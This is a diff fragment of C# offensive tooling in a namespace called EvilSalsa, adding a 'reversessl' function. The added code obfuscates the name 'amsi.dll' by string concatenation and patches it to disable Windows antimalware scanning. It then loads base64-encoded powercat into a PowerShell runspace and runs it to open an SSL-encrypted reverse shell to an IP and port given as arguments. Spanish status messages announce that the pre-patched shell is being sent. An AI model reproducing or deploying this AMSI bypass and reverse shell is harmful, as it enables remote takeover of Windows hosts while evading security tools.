@@ -114,6 +114,30 @@ namespace EvilSalsa
             return 0;
         }
 
+        public static int reversessl (string[] args)
+        {
+
+            CyberVaca.showbanner();
+            string Salsa = "am" + "si" + ".dll";
+            string checkdll = "c:\\Windows\\System32\\" + Salsa;
+            if (System.IO.File.Exists(checkdll) == true) { CyberVaca.Parchea(Salsa); }
+            string reversa = args[0].ToString();
+            string ip = (reversa.Split(' ')[0]);
+            string puerto = (reversa.Split(' ')[1]);
+            if (System.IO.File.Exists(checkdll) == true) { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); } else { Console.WriteLine("[+] Enviando shell reversa pre-parcheada"); }
+            //--------------------- Funciones para cargar ------------------------------
+            RunspaceConfiguration rspacecfg = RunspaceConfiguration.Create();
+            Runspace rspace = RunspaceFactory.CreateRunspace( rspacecfg );
+     		rspace.Open();            
+     		Pipeline pipeline = rspace.CreatePipeline();
+
+            //--------------------- Funciones para cargar ------------------------------
+            pipeline.Commands.AddScript(SalseoLoader.powercat.powercatbase64());
+            pipeline.Commands.AddScript(SalseoLoader.Load_Ps1.loadfileps1());
+            pipeline.Commands.AddScript( "powercat -c " + ip + " -p " + puerto +" -ep -ssl" );
+            pipeline.Invoke();
+            return 0;
+        }
         public static int reverseudp(string[] args)
         {
 
